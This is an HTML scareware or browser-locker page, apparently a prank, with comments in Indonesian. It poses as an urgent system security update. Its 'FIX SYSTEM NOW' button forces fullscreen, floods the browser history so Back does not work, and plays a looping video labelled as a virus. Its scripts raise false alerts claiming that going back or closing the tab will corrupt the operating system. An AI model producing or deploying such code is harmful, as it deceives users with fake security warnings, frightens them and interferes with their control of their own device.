<!DOCTYPE html>
<html>
<head>
    <title>System Update Required</title>
    <style>
        body { margin: 0; background: black; color: white; font-family: sans-serif; overflow: hidden; cursor: none; }
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 99; display: flex; align-items: center; justify-content: center; text-align: center; }
        iframe { width: 100vw; height: 100vh; border: none; }
    </style>
</head>
<body>

<div id="overlay">
    <div>
        <h2>SYSTEM CRITICAL ERROR</h2>
        <p>Your device requires an immediate security update.</p>
        <button id="startBtn" style="padding: 15px 30px; font-size: 20px; cursor: pointer; background: #ff0000; color: white; border: none; border-radius: 5px;">FIX SYSTEM NOW</button>
    </div>
</div>

<div id="videoContainer" style="display:none;">
    <iframe id="virusVid" src="https://www.youtube.com/embed/c42RQKm20AE?autoplay=1&controls=0&loop=1&playlist=c42RQKm20AE&disablekb=1" allow="autoplay; fullscreen"></iframe>
</div>

<script>
    const startBtn = document.getElementById('startBtn');
    const overlay = document.getElementById('overlay');
    const container = document.getElementById('videoContainer');

    startBtn.onclick = function() {
        overlay.style.display = 'none';
        container.style.display = 'block';
        
        // Paksa Fullscreen
        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen();
        }

        // Lock history biar gak bisa dipencet "Back" di HP
        for (let i = 0; i < 50; i++) {
            window.history.pushState(null, "", window.location.href);
        }
    };

    // Peringatan saat mau tutup tab
    window.onbeforeunload = function() {
        return "System failure! Closing this tab will corrupt your OS. Continue?";
    };

    // Anti-Back Button di Android/Browser
    window.onpopstate = function() {
        window.history.pushState(null, "", window.location.href);
        alert("CRITICAL ERROR: Cannot go back during system repair!");
    };
</script>
</body>
</html>
